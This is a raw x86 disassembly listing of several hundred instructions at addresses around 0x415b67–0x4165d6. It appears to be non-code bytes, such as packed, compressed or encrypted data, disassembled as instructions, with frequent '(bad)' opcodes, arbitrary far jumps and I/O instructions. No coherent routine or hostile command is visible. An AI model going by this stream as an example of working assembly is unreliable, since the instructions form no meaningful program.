  415b67:	mov    esp,0xfe04ca4d
  415b6c:	or     eax,0x60fee04b
  415b71:	repz js 0x415bc0
  415b74:	jns    0x415b58
  415b76:	dec    esi
  415b77:	aas    
  415b78:	(bad)  
  415b7a:	add    al,0x8c
  415b7c:	js     0x415bd9
  415b7e:	add    edi,esi
	...
  415b9c:	add    BYTE PTR [eax],al
  415b9e:	retf   0x3c8e
  415ba1:	out    0x2e,eax
  415ba3:	sub    DWORD PTR [edx],eax
  415ba5:	add    BYTE PTR [esi-0x327bf99c],al
  415bab:	mov    edi,cs
  415bad:	jmp    0x9bf6:0x93bd8df6
  415bb4:	mov    esi,0xc72a9afe
  415bb9:	neg    DWORD PTR [edx]
  415bbb:	adc    DWORD PTR [eax+0x6],edi
  415bbe:	inc    edi
  415bbf:	xchg   esp,eax
  415bc0:	scas   al,BYTE PTR es:[edi]
  415bc1:	inc    BYTE PTR [edx-0x71ec72be]
  415bc7:	mov    WORD PTR [esi+0x15272fe],?
  415bcd:	je     0x415bcb
  415bcf:	push   DWORD PTR [edx-0x44]
  415bd2:	or     eax,0x5bae63c6
  415bd7:	add    DWORD PTR [ebp-0x2e46f771],edx
  415bdd:	xchg   BYTE PTR [esi-0x3e85b372],bl
  415be3:	repz mov ecx,0x7cbaf543
  415be9:	xchg   ecx,ecx
  415beb:	(bad)  
  415bec:	and    edi,DWORD PTR [esi+ebx*4]
  415bef:	leave  
  415bf0:	push   ecx
  415bf1:	jmp    0x792ba609
  415bf6:	mov    DWORD PTR [eax-0xeecfbab],ebp
  415bfc:	xchg   esi,eax
  415bfd:	call   DWORD PTR [edx]
  415bff:	lds    ebp,FWORD PTR [ebx+0xf]
	...
  415c1d:	add    BYTE PTR [eax],al
  415c1f:	add    BYTE PTR [ebx],dl
  415c21:	jl     0x415c4f
  415c23:	add    ecx,DWORD PTR ds:0x597aab00
  415c29:	add    al,0xf1
  415c2b:	scas   al,BYTE PTR es:[edi]
  415c2c:	push   ss
  415c2d:	mov    es,WORD PTR [edi]
  415c2f:	sbb    ah,BYTE PTR [eax+0xa03e8ff]
  415c35:	dec    edx
  415c36:	jmp    0x7c7f:0xdd0c49c8
  415c3d:	(bad)  
  415c3e:	call   0x93b8ab46
  415c43:	pop    es
  415c44:	imul   DWORD PTR [edx+0x16a791e4]
  415c4a:	inc    esp
  415c4b:	add    ecx,DWORD PTR ds:0xe9892000
  415c51:	add    ch,bl
  415c53:	add    ecx,DWORD PTR [ebx]
  415c55:	jl     0x415cc7
  415c57:	add    al,0xd
  415c59:	add    BYTE PTR [edx],dl
  415c5b:	pop    ecx
  415c5c:	popf   
  415c5d:	lock outs dx,BYTE PTR ds:[esi]
  415c5f:	xchg   ebx,eax
  415c60:	or     eax,0xefeee900
  415c65:	jl     0x415c66
  415c67:	jae    0x415c32
  415c69:	add    bh,dh
  415c6b:	scas   al,BYTE PTR es:[edi]
  415c6c:	adc    DWORD PTR [edi+eiz*1+0x756fc5e2],ecx
  415c73:	cmp    DWORD PTR [esi],ecx
  415c75:	mov    ebx,fs
  415c77:	(bad)  
  415c78:	les    eax,FWORD PTR [ebx]
  415c7a:	(bad)  
  415c7b:	adc    al,0xa1
  415c7d:	je     0x415c13
  415c7f:	sub    eax,0x7efe020e
	...
  415ca0:	add    BYTE PTR [eax],al
  415ca2:	je     0x415c63
  415ca4:	(bad)  
  415ca5:	jbe    0x415cb5
  415ca7:	pop    ss
  415ca8:	adc    al,0xd7
  415caa:	push   cs
  415cab:	add    BYTE PTR [ebx-0x4083dd44],cl
  415cb1:	aam    0xd6
  415cb3:	push   ss
  415cb4:	sub    al,0x62
  415cb6:	dec    esp
  415cb7:	mov    ebx,0x8a0e4efe
  415cbc:	inc    ebx
  415cbd:	pop    ecx
  415cbe:	or     al,ch
  415cc0:	cmp    DWORD PTR [ecx],ebx
  415cc2:	sbb    DWORD PTR [esi],0xffffff8a
  415cc5:	fs push ebp
  415cc7:	std    
  415cc8:	std    
  415cc9:	cs call 0x7308:0x212e29c2
  415cd1:	stc    
  415cd2:	xchg   ebx,eax
  415cd3:	std    
  415cd4:	call   FWORD PTR [edx+edi*8+0xfb48b89]
  415cdb:	(bad)  
  415cdc:	std    
  415cdd:	rcl    DWORD PTR [esi-0x1],0x71
  415ce1:	lock push eax
  415ce3:	xchg   DWORD PTR [ebx-0xb],edx
  415ce6:	repz push edx
  415ce8:	or     al,0x7b
  415cea:	mov    DWORD PTR [eax+0x72fde67a],eax
  415cf0:	and    BYTE PTR [edx-0x33],ch
  415cf3:	inc    eax
  415cf4:	std    
  415cf5:	(bad)  
  415cf6:	(bad)  
  415cf8:	je     0x415cda
  415cfa:	xchg   ebx,eax
  415cfb:	mov    ebx,0x24b0040
  415d00:	inc    BYTE PTR [edx]
  415d02:	inc    ecx
  415d03:	adc    dh,BYTE PTR [edi]
  415d05:	push   ebp
	...
  415d22:	add    BYTE PTR [eax],al
  415d24:	push   0x5e800576
  415d29:	or     eax,0x8d360471
  415d2e:	push   ecx
  415d2f:	cld    
  415d30:	fistp  QWORD PTR [edi-0x8]
  415d33:	xor    ebp,DWORD PTR [ebp+0x5d0c798c]
  415d39:	push   eax
  415d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d3b:	jne    0x415d54
  415d3d:	cmp    eax,0x6138f049
  415d42:	xchg   edi,eax
  415d44:	dec    edi
  415d45:	lds    edi,FWORD PTR [ecx]
  415d47:	call   0x7d416083
  415d4c:	sar    BYTE PTR ss:[bx+di],0x69
  415d51:	test   DWORD PTR [ebx],0xc205e49d
  415d57:	cmp    esi,DWORD PTR [ecx+0xd4476d2]
  415d5d:	push   ecx
  415d5e:	fdiv   QWORD PTR [eax+ebx*8+0x3d]
  415d62:	ret    
  415d63:	packuswb mm6,QWORD PTR [ebp+edi*8-0x1]
  415d68:	hlt    
  415d69:	adc    DWORD PTR [esi+0x493db408],esi
  415d6f:	lock and BYTE PTR [edi+esi*1],0x4d
  415d74:	sub    BYTE PTR [edi+0x19],dh
  415d77:	cmp    esi,ebx
  415d79:	je     0x415d69
  415d7b:	jmp    0x415d29
  415d7d:	cmp    eax,0x58270fc3
  415d82:	std    
  415d83:	jmp    DWORD PTR [ecx+edx*1+0x8b6]
	...
  415da6:	je     0x415de5
  415da8:	dec    ecx
  415da9:	lock inc eax
  415dab:	or     dh,BYTE PTR [edi]
  415dad:	(bad)  
  415dae:	ss cmc 
  415db0:	out    0x1,eax
  415db2:	or     eax,0x1ac53b21
  415db7:	push   0x3d
  415db9:	inc    DWORD PTR [edx+0x5d438ae8]
  415dbf:	jno    0x415e3e
  415dc1:	cld    
  415dc2:	xchg   BYTE PTR [ebx],bl
  415dc4:	nop
  415dc5:	xor    DWORD PTR [ebp+0x18],ecx
  415dc8:	push   esp
  415dc9:	push   eax
  415dca:	bound  ebx,QWORD PTR [ebx+0x24]
  415dcd:	std    
  415dce:	pop    edx
  415dcf:	popf   
  415dd0:	lea    ecx,[ebx-0x20069db]
  415dd6:	fadd   QWORD PTR [edx]
  415dd8:	push   es
  415dd9:	push   eax
  415dda:	fidiv  DWORD PTR [ecx-0x31]
  415ddd:	xchg   DWORD PTR [eax+0x6d7b8960],edi
  415de3:	pop    edi
  415de4:	test   DWORD PTR [eax],ebp
  415de6:	sub    ch,BYTE PTR [ebp-0x1]
  415de9:	call   0xfe4094f3
  415dee:	fisubr WORD PTR [edi]
  415df0:	mov    ebx,eax
  415df2:	aam    0xa3
  415df4:	test   DWORD PTR [esi+edx*1+0x10],esi
  415df8:	dec    ebp
  415df9:	call   0x43ce4b76
  415dfe:	lods   eax,DWORD PTR ds:[esi]
  415dff:	jo     0x415e46
  415e01:	call   0xfc5f9092
  415e06:	jmp    0x0:0x840f2e
	...
  415e25:	add    BYTE PTR [eax],al
  415e27:	add    dl,dh
  415e29:	out    0x1,eax
  415e2b:	add    BYTE PTR [edx+eiz*1+0x16d2fc1b],cl
  415e32:	js     0x415e51
  415e34:	test   ebx,ebp
  415e36:	std    
  415e37:	std    
  415e38:	ret    0xd9c2
  415e3b:	je     0x415e9c
  415e3d:	out    dx,al
  415e3e:	(bad)  
  415e3f:	fimul  DWORD PTR ds:0xa67f01e7
  415e45:	int    0xfd
  415e47:	std    
  415e48:	mov    ds:0xd40c6500,al
  415e4d:	(bad)  
  415e4e:	out    dx,al
  415e4f:	xchg   bh,al
  415e51:	add    bh,ah
  415e53:	add    edx,DWORD PTR [ebx+edi*2-0x26c3b735]
  415e5a:	add    BYTE PTR [edi+0x61],bl
  415e5d:	je     0x415eaf
  415e5f:	(bad)  
  415e60:	into   
  415e61:	sti    
  415e62:	lock sahf 
  415e64:	int    0xfc
  415e66:	scas   al,BYTE PTR es:[edi]
  415e67:	add    al,bl
  415e69:	das    
  415e6a:	loop   0x415eb2
  415e6c:	xor    DWORD PTR [ecx+0x40],0x62e3d901
  415e73:	dec    esi
  415e74:	mov    eax,ds:0x404354fd
  415e79:	std    
  415e7a:	xchg   BYTE PTR [esi+0x7e449e],cl
  415e80:	xor    ebp,eax
  415e82:	aad    0x17
  415e84:	or     eax,0x10c36400
  415e89:	add    DWORD PTR [esi+0x3],0x0
	...
  415ea8:	add    BYTE PTR [eax],al
  415eaa:	or     eax,0xda3b5200
  415eaf:	jp     0x415f20
  415eb1:	ja     0x415e7b
  415eb3:	mov    ah,cl
  415eb5:	fwait
  415eb6:	hlt    
  415eb7:	mov    ebp,0x28a14e72
  415ebc:	ins    BYTE PTR es:[edi],dx
  415ebd:	inc    edi
  415ebe:	lock cld 
  415ec0:	ss cmp al,0xaa
  415ec3:	je     0x415ecd
  415ec5:	mov    ss,WORD PTR [esi-0x24ffd9ad]
  415ecb:	aaa    
  415ecc:	out    dx,eax
  415ecd:	jbe    0x415ec7
  415ecf:	adc    BYTE PTR [edi+eax*2-0x38],0xfc
  415ed4:	push   cs
  415ed5:	add    bh,BYTE PTR [ecx]
  415ed7:	jno    0x415f4a
  415ed9:	xchg   BYTE PTR [esi-0x3],bl
  415edc:	(bad)  
  415edd:	inc    DWORD PTR [edx+ecx*2+0x3ce7f500]
  415ee4:	push   DWORD PTR [ebx+ebp*1-0x7b]
  415ee8:	jnp    0x415ecf
  415eea:	fcomp  DWORD PTR [eax-0x28]
  415eed:	push   esp
  415eee:	sub    al,0x37
  415ef0:	jnp    0x415ec3
  415ef2:	add    bl,BYTE PTR [eax-0x80]
  415ef5:	dec    esi
  415ef6:	or     BYTE PTR [eax],0x73
  415ef9:	push   ss
  415efa:	ss jns 0x415ef5
  415efd:	cmp    ah,BYTE PTR [edi]
  415eff:	cmp    BYTE PTR ds:0xf620e5e3,0x27
  415f06:	std    
  415f07:	pop    ds
  415f08:	jae    0x415f10
  415f0a:	mov    ?,WORD PTR [eax+0x9e40]
	...
  415f2c:	push   edx
  415f2d:	cli    
  415f2e:	call   FWORD PTR [edi+ebx*1]
  415f31:	jg     0x415eee
  415f33:	sub    DWORD PTR [edx-0x6],eax
  415f36:	std    
  415f37:	jmp    0x415efb
  415f39:	add    al,0x81
  415f3b:	cmp    al,0xc5
  415f3d:	cli    
  415f3e:	std    
  415f3f:	jbe    0x415f50
  415f41:	jno    0x415f47
  415f43:	es nop
  415f45:	js     0x415f43
  415f47:	or     BYTE PTR [ebx+eax*8-0x52a8377],ch
  415f4e:	std    
  415f4f:	push   esi
  415f50:	clc    
  415f51:	iret   
  415f52:	cld    
  415f53:	dec    esi
  415f54:	add    dh,BYTE PTR [edx]
  415f56:	fst    DWORD PTR [edx+0x20]
  415f59:	xor    ecx,ebx
  415f5b:	cli    
  415f5c:	repz inc ebp
  415f5e:	cmp    DWORD PTR [esi],edx
  415f60:	gs pop eax
  415f62:	jg     0x415f96
  415f64:	add    ah,bh
  415f66:	std    
  415f67:	es push ebp
  415f69:	push   eax
  415f6a:	sbb    DWORD PTR [esi+ebp*8-0x681a8c00],0xc20e3487
  415f75:	std    
  415f76:	std    
  415f77:	add    cl,bl
  415f79:	push   ebx
  415f7a:	ret    
  415f7b:	inc    ebx
  415f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f7d:	imul   esi,esp,0x74d73958
  415f83:	or     ebx,DWORD PTR [edi-0x29]
  415f86:	je     0x415f8f
  415f88:	pop    ds
  415f89:	mov    esi,0xffa4a9e5
  415f8e:	dec    DWORD PTR [edx+0x0]
	...
  415fac:	add    BYTE PTR [eax],al
  415fae:	xor    esp,ebp
  415fb0:	or     ecx,0x7d7f23d8
  415fb6:	pop    eax
  415fb7:	add    al,0xb
  415fb9:	mov    gs,esp
  415fbb:	(bad)  
  415fbc:	(bad)  
  415fbd:	dec    DWORD PTR [edi]
  415fbf:	push   ecx
  415fc0:	or     BYTE PTR [ebx+0xa8513f9],cl
  415fc6:	fisttp WORD PTR [edi-0x8]
  415fc9:	sub    esp,DWORD PTR [ecx]
  415fcb:	or     al,0x85
  415fcd:	dec    edx
  415fce:	cmp    ah,ch
  415fd0:	add    BYTE PTR [eax],0x34
  415fd3:	(bad)  
  415fd4:	jle    0x415f9e
  415fd6:	xchg   ebx,eax
  415fd7:	out    0x79,al
  415fd9:	mov    edi,DWORD PTR [ecx]
  415fdb:	adc    esi,DWORD PTR ds:0x3e73944d
  415fe1:	xor    DWORD PTR [edx-0x5edd83fe],0x2
  415fe8:	mov    cl,0xf8
  415fea:	mov    bl,0xf9
  415fec:	sti    
  415fed:	push   eax
  415fee:	outs   dx,DWORD PTR ds:[esi]
  415fef:	mov    BYTE PTR [edi+edi*8],dh
  415ff2:	push   ebx
  415ff3:	cli    
  415ff4:	jg     0x415fb6
  415ff6:	cld    
  415ff7:	dec    esi
  415ff8:	xchg   DWORD PTR [ebp-0x2c],eax
  415ffb:	jge    0x415fbd
  415ffd:	or     BYTE PTR [ecx+edi*8+0x3eba4c11],al
  416004:	add    BYTE PTR [ebx+0x75350b28],al
  41600a:	cmp    al,0x7d
  41600c:	push   es
  41600d:	mov    DWORD PTR ds:0xfd6154,ecx
	...
  41602f:	add    dl,al
  416031:	or     DWORD PTR [edx-0x1fdfe75],ecx
  416037:	std    
  416038:	mov    dl,0xd3
  41603a:	push   ebp
  41603b:	lds    ecx,FWORD PTR [esi-0x17]
  41603e:	cmp    BYTE PTR [ebx-0x20415d3],0xd
  416045:	pop    ebp
  416046:	or     BYTE PTR [ecx],dh
  416048:	int    0xcd
  41604a:	or     al,0x89
  41604c:	rol    BYTE PTR [eax-0x48b0d667],1
  416052:	cld    
  416053:	cmp    DWORD PTR [ebx-0x1a],0xa93e047e
  41605a:	out    0x17,eax
  41605c:	xchg   esi,eax
  41605d:	sbb    ebx,DWORD PTR [ecx+ebp*1+0x4b8758b8]
  416064:	std    
  416065:	outs   dx,DWORD PTR ds:[esi]
  416066:	adc    DWORD PTR [ecx+0x53277cb8],ecx
  41606c:	popf   
  41606d:	pop    edi
  41606e:	push   ecx
  41606f:	add    al,0x36
  416071:	in     eax,0x67
  416073:	(bad)  
  416074:	aad    0x21
  416076:	pop    esi
  416077:	pop    ecx
  416078:	inc    esp
  416079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41607a:	adc    al,0x0
  41607c:	rcr    BYTE PTR [ebp-0x10],0x4f
  416080:	mov    esp,0xe0895615
  416085:	nop
  416086:	adc    al,BYTE PTR [eax+0xd]
  416089:	shl    DWORD PTR [ecx-0x318b28c],1
  41608f:	xor    eax,0xbc6c3202
	...
  4160b0:	add    BYTE PTR [eax],al
  4160b2:	and    DWORD PTR [edi+0x6e3afd01],0x66c3fddc
  4160bc:	gs clc 
  4160be:	or     eax,0xb683f45e
  4160c3:	add    BYTE PTR [ebx-0x6c0d71d5],bl
  4160c9:	daa    
  4160ca:	xchg   esi,eax
  4160cb:	inc    ebx
  4160cc:	adc    edx,DWORD PTR [edi+esi*1+0x0]
  4160d0:	push   cs
  4160d1:	ja     0x4160d8
  4160d3:	stc    
  4160d4:	sbb    al,BYTE PTR [edi-0x32b8c33]
  4160da:	push   ds
  4160db:	or     al,0x62
  4160dd:	lds    esp,FWORD PTR [eax+0xaebeb73]
  4160e3:	add    bh,ah
  4160e5:	add    edx,DWORD PTR [eax-0x3175248d]
  4160eb:	not    esi
  4160ed:	aad    0x94
  4160ef:	inc    ebx
  4160f0:	iret   
  4160f1:	pop    ebp
  4160f2:	aam    0xc6
  4160f4:	test   eax,0x72530d0b
  4160f9:	out    dx,eax
  4160fa:	mov    esp,gs
  4160fc:	and    edx,DWORD PTR [ecx-0x45]
  4160ff:	test   ah,dh
  416101:	stos   DWORD PTR es:[edi],eax
  416102:	(bad)  
  416103:	aas    
  416104:	out    0x54,eax
  416106:	test   al,bh
  416108:	paddq  mm0,mm1
  41610b:	aas    
  41610c:	out    0xfc,eax
  41610e:	clc    
  41610f:	shl    BYTE PTR [eax+esi*8],0x1b
  416113:	add    bh,ah
  416115:	add    eax,DWORD PTR [eax]
	...
  416133:	add    BYTE PTR [eax],dh
  416135:	ror    BYTE PTR [edi],cl
  416137:	lock mov eax,ds:0xd8fce73f
  41613d:	test   BYTE PTR [edi-0x1497bc04],cl
  416143:	jbe    0x416112
  416145:	call   FWORD PTR [ebp+0x34]
  416148:	xchg   edx,eax
  416149:	inc    edx
  41614a:	push   edi
  41614b:	cld    
  41614c:	fld    TBYTE PTR [edx*2+0x2e84e8a]
  416153:	fiadd  WORD PTR [eax]
  416155:	test   dl,bh
  416157:	add    cl,BYTE PTR ds:0x5bf00000
  41615d:	lock or eax,0xfdf92465
  416163:	jmp    0x654f237d
  416168:	in     al,dx
  416169:	clc    
  41616a:	std    
  41616b:	jmp    0xba359e03
  416170:	mov    edi,DWORD PTR [esp+edi*8]
  416173:	cdq    
  416174:	xchg   DWORD PTR [eax+edi*8+0x70],ebp
  416178:	and    edi,esp
  41617a:	xchg   DWORD PTR [edx+ebx*4-0x6],edi
  41617e:	shl    DWORD PTR [esi+ecx*8+0xa],1
  416182:	sub    ebx,0x9
  416185:	add    BYTE PTR [eax],al
  416187:	jb     0x416155
  416189:	repz cmp DWORD PTR [edi-0x160a7bea],ebp
  416190:	push   cs
  416191:	add    BYTE PTR [edi],dh
  416193:	cmp    al,0x75
  416195:	or     al,BYTE PTR [edi+ecx*8+0x0]
	...
  4161b4:	add    BYTE PTR [eax],al
  4161b6:	adc    DWORD PTR [eax],eax
  4161b8:	add    cl,al
  4161ba:	xchg   esi,eax
  4161bb:	jae    0x4161bc
  4161bd:	call   0xc77b394d
  4161c2:	push   es
  4161c3:	test   ch,bl
  4161c5:	jmp    0x969261d8
  4161ca:	mov    esp,0x3514fdf3
  4161cf:	cli    
  4161d0:	push   ebx
  4161d1:	jns    0x41615f
  4161d3:	mov    edi,0x6ce9c073
  4161d8:	cld    
  4161d9:	push   edx
  4161db:	test   BYTE PTR [ecx-0x47],bh
  4161de:	pop    ss
  4161df:	xor    bh,ch
  4161e1:	fmul   QWORD PTR [edx]
  4161e3:	sti    
  4161e4:	adc    ecx,DWORD PTR [ecx+0x6c004023]
  4161ea:	leave  
  4161eb:	ins    BYTE PTR es:[edi],dx
  4161ec:	or     DWORD PTR [edi+0x4cbd93],esp
  4161f2:	(bad)  
  4161f4:	cld    
  4161f5:	jb     0x416233
  4161f7:	out    0x11,eax
  4161f9:	imul   esp,DWORD PTR [edx],0x48
  4161fc:	push   0x10
  4161fe:	out    0xee,eax
  416200:	push   esi
  416201:	lea    esp,[ecx+0x67e850db]
  416207:	jo     0x416206
  416209:	push   DWORD PTR [edi]
  41620b:	popa   
  41620c:	cld    
  41620d:	add    bh,dl
  41620f:	icebp  
  416210:	dec    edi
  416211:	call   0x3ec9b5
  416216:	int    0x70
  416218:	cld    
  416219:	sldt   WORD PTR [eax]
	...
  416238:	xor    DWORD PTR [ebp-0x775c0000],eax
  41623e:	inc    ecx
  41623f:	clc    
  416240:	aam    0x2e
  416242:	sti    
  416243:	inc    edi
  416244:	inc    ebx
  416245:	push   edx
  416246:	sti    
  416247:	adc    eax,0x40118c
  41624c:	icebp  
  41624d:	ret    0x7671
  416250:	or     eax,0x2574f871
  416255:	test   DWORD PTR [ecx-0x48],esi
  416258:	pop    ebp
  416259:	jo     0x416247
  41625b:	jbe    0x4162b9
  41625d:	adc    BYTE PTR gs:[eax+0x8],ch
  416261:	jno    0x4162a3
  416263:	add    BYTE PTR [ecx-0x73af43c1],bh
  416269:	imul   esi,DWORD PTR [ecx+eax*1+0x24],0x1fb84186
  416271:	mov    esp,0xf0c71c
  416276:	rol    BYTE PTR [esp+esi*1],1
  416279:	add    eax,DWORD PTR [eax]
  41627b:	mov    esi,ecx
  41627d:	mov    bl,0x67
  41627f:	ror    BYTE PTR [eax],0x85
  416282:	jl     0x416289
  416284:	cmp    BYTE PTR [esi-0x3df247bf],al
  41628a:	rcr    DWORD PTR [eax+ecx*4],0x93
  41628e:	in     eax,0x87
  416290:	inc    ecx
  416291:	in     al,0xcd
  416293:	std    
  416294:	push   eax
  416295:	or     DWORD PTR [eax-0x77675abd],0x43
	...
  4162b7:	add    BYTE PTR [eax],al
  4162b9:	add    BYTE PTR [ebp-0x2a8c0568],dh
  4162bf:	sbb    eax,0xabca0870
  4162c4:	jmp    0x40a3304c
  4162c9:	clc    
  4162ca:	inc    ecx
  4162cb:	loop   0x41625b
  4162cd:	or     BYTE PTR [ebp-0x2],bl
  4162d0:	push   ebx
  4162d1:	or     BYTE PTR [ebx+ebp*2+0x6213e9f9],dl
  4162d8:	cmp    DWORD PTR [esi+0x43],edx
  4162db:	mov    edx,0xbade4fcc
  4162e0:	push   esi
  4162e1:	push   eax
  4162e2:	mov    ch,BYTE PTR ds:0xd0c88910
  4162e8:	jmp    0x4162ec
  4162ea:	ds test eax,0xafd65e57
  4162f0:	(bad)  
  4162f1:	or     BYTE PTR ds:0xbcec8b0c,cl
  4162f7:	pop    ss
  4162f8:	dec    edi
  4162f9:	mov    DWORD PTR [edx+eiz*2-0x74],edx
  4162fd:	add    BYTE PTR [ecx+ebp*8],cl
  416300:	add    DWORD PTR [eax-0x77716a28],ecx
  416306:	or     al,0xe8
  416308:	add    DWORD PTR [eax],eax
  41630a:	test   DWORD PTR [ebx],edx
  41630c:	cli    
  41630d:	sbb    DWORD PTR [edi-0xc],0x4a
  416311:	mov    eax,ebx
  416313:	lock sub al,0xcd
  416316:	mov    esi,0x84f8455f
  41631b:	or     ecx,DWORD PTR [esi+edx*2]
	...
  41633a:	add    BYTE PTR [eax],al
  41633c:	adc    edi,edi
  41633e:	stos   DWORD PTR es:[edi],eax
  41633f:	clc    
  416340:	sbb    BYTE PTR [esi+0xc97f8d4],ch
  416346:	in     eax,dx
  416347:	add    ebx,DWORD PTR [esi-0xa]
  41634a:	fidiv  WORD PTR [ecx+0x1871f646]
  416350:	jmp    0xe80c:0x9501db7d
  416357:	or     BYTE PTR [ebx-0x64f71afc],ah
  41635d:	shr    dl,cl
  41635f:	int    0x94
  416361:	dec    ebx
  416362:	pop    ds
  416363:	and    edx,0xfffffff5
  416366:	out    0x3,eax
  416368:	or     eax,0xff02db8a
  41636d:	add    eax,ecx
  41636f:	mov    ebx,DWORD PTR [eax]
  416371:	cmp    eax,0x6b1546fe
  416376:	sub    eax,0x9c8a345a
  41637b:	clc    
  41637c:	test   DWORD PTR [eax+0xd02e7],ecx
  416382:	jno    0x4163ca
  416384:	or     DWORD PTR [eax-0xa85fda1],0xffffffe7
  41638b:	pop    eax
  41638c:	dec    edx
  41638d:	ret    0x3eb
  416390:	ror    BYTE PTR [eax+0x7b4a34c0],0xb6
  416397:	outs   dx,DWORD PTR ds:[esi]
  416398:	cli    
  416399:	push   eax
  41639a:	adc    eax,0x97295f8d
  41639f:	lea    eax,[eax]
	...
  4163bd:	add    BYTE PTR [ecx],ah
  4163bf:	(bad)  
  4163c0:	jno    0x416419
  4163c2:	jmp    0x22513cd6
  4163c7:	aas    
  4163c8:	pop    edi
  4163c9:	adc    esi,esp
  4163cb:	inc    ebx
  4163cc:	retf   
  4163cd:	setle  BYTE PTR [ecx]
  4163d0:	mov    edx,0x44cdca
  4163d5:	cld    
  4163d6:	sub    eax,0x4b0e5956
  4163db:	or     BYTE PTR [eax],al
  4163dd:	mov    esp,0xa489e399
  4163e2:	push   ss
  4163e3:	jg     0x4163d1
  4163e5:	in     eax,0x91
  4163e7:	js     0x4163f5
  4163e9:	jmp    0xea14e1f3
  4163ee:	push   cs
  4163ef:	add    BYTE PTR [ecx+0x6c],dl
  4163f2:	push   ebx
  4163f3:	clc    
  4163f4:	push   esi
  4163f5:	add    cl,bl
  4163f7:	dec    edx
  4163f8:	mov    DWORD PTR [eax],esi
  4163fa:	pusha  
  4163fb:	inc    ebp
  4163fd:	lods   al,BYTE PTR ds:[esi]
  4163fe:	(bad)  
  416401:	lods   al,BYTE PTR ds:[esi]
  416402:	(bad)  
  416403:	push   ebp
  416404:	adc    DWORD PTR [edx+edx*1-0x7f238a00],0x53060d0b
  41640f:	add    al,0xfe
  416411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416413:	xchg   DWORD PTR [edi],ecx
  416415:	add    dl,BYTE PTR [ecx]
  416417:	mov    esi,0x464fe8ff
  41641c:	jae    0x4163ed
  41641e:	adc    ch,BYTE PTR [esi+0xe14b]
	...
  416440:	xchg   esi,eax
  416441:	les    edi,FWORD PTR [edi-0x6575f03d]
  416447:	sbb    esp,edi
  416449:	aas    
  41644a:	add    dh,dh
  41644c:	mov    eax,0x686af750
  416451:	dec    BYTE PTR [eax+0x4d450bb]
  416457:	test   al,0x6b
  416459:	sti    
  41645a:	or     BYTE PTR [eax+0x14308597],bl
  416460:	leave  
  416461:	inc    DWORD PTR [eax+0x7b800eae]
  416467:	mov    cs,WORD PTR [eax]
  416469:	mov    BYTE PTR [ebx+0x0],cl
  41646c:	test   eax,0xda0f1365
  416471:	inc    esi
  416472:	cli    
  416473:	add    DWORD PTR [esi+0x26e2bcfc],0xffffffbb
  41647a:	in     eax,0x6
  41647c:	dec    ecx
  41647e:	mov    dl,BYTE PTR [ecx+0x407124]
  416484:	dec    edi
  416485:	(bad)  
  416486:	mov    cl,0x3d
  416488:	fs jns 0x416486
  41648b:	add    ch,BYTE PTR [edx-0x4e49f506]
  416491:	stc    
  416492:	jg     0x416475
  416494:	jecxz  0x41641f
  416496:	test   DWORD PTR [eax],esi
  416498:	cdq    
  416499:	aas    
  41649a:	add    bl,ch
  41649c:	mov    dh,0xac
  41649e:	cmp    DWORD PTR [eax+0x74000fa1],eax
	...
  4164c0:	add    BYTE PTR [eax],al
  4164c2:	(bad)  
  4164c5:	repz mov al,BYTE PTR [eax+esi*1-0xe8f15f1]
  4164cd:	pminub mm1,mm5
  4164d0:	or     esi,DWORD PTR [esi+0x708551ed]
  4164d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164d7:	push   ebp
  4164d8:	test   DWORD PTR [eax+0x78],edx
  4164db:	push   ebp
  4164dc:	test   DWORD PTR [eax+0x6a],ecx
  4164df:	jle    0x4164a1
  4164e1:	or     BYTE PTR [edi+0xc],cl
  4164e4:	mov    BYTE PTR [eax],bl
  4164e6:	out    dx,al
  4164e7:	push   edi
  4164e8:	icebp  
  4164e9:	mov    BYTE PTR [edi*8-0x7889af79],ch
  4164f0:	dec    eax
  4164f1:	add    esp,edi
  4164f3:	mov    esi,0x8218304
  4164f8:	add    BYTE PTR [edi],cl
  4164fa:	mov    ebx,0xa3fffb36
  4164ff:	dec    edx
  416500:	pop    esi
  416501:	pop    ebx
  416502:	or     eax,0x440840be
  416507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416508:	add    eax,0xe56dc000
  41650d:	xor    DWORD PTR [ecx],0x885552e5
  416513:	lods   eax,DWORD PTR ds:[esi]
  416514:	add    al,0x89
  416516:	enter  0x8ae0,0xd7
  41651a:	xchg   esp,eax
  41651b:	mov    ds:0xe1d239ed,eax
  416520:	sub    BYTE PTR [ebp+0x5601e90d],0x0
	...
  416543:	add    BYTE PTR [esi],bh
  416545:	dec    ebx
  416546:	xor    dl,dl
  416548:	sbb    dh,BYTE PTR es:[edx+0x4e]
  41654c:	pop    ds
  41654d:	xor    BYTE PTR [ebp-0x39],bh
  416550:	pusha  
  416551:	out    dx,al
  416552:	cmp    DWORD PTR [ebx+0x1],0x410987e9
  416559:	in     al,0x82
  41655b:	ror    DWORD PTR [edi],0xe
  41655e:	add    al,0x41
  416560:	mov    BYTE PTR [edi-0x75bdc330],ah
  416566:	or     cl,BYTE PTR ds:0x88872763
  41656c:	push   eax
  41656d:	ins    BYTE PTR es:[edi],dx
  41656e:	inc    ecx
  41656f:	add    BYTE PTR [esi-0x7638d01a],ah
  416575:	pop    ds
  416576:	ins    DWORD PTR es:[edi],dx
  416577:	or     ecx,DWORD PTR [ebp-0x3374df21]
  41657d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41657e:	add    edx,DWORD PTR [esp+ecx*2+0x4522c9ca]
  416585:	or     eax,0x645072d3
  41658a:	leave  
  41658b:	je     0x416597
  41658d:	sbb    esi,esi
  41658f:	mov    DWORD PTR [ebp-0x3007f2e4],0xc904fa65
  416599:	call   DWORD PTR [edi+edi*2+0x3b]
  41659d:	imul   esi,DWORD PTR [edx],0xffffff8a
  4165a0:	(bad)  
  4165a1:	mul    DWORD PTR [ecx+0x3f]
  4165a4:	cmp    al,BYTE PTR [ebp+0xfb34]
	...
  4165c6:	dec    ebp
  4165c7:	loopne 0x4165b2
  4165c9:	ret    
  4165ca:	xor    eax,0x87c2f0fb
  4165cf:	inc    esp
  4165d0:	jno    0x41655e
  4165d2:	into   
  4165d3:	repz popa 
  4165d5:	ret    
  4165d6:	int    0xdf
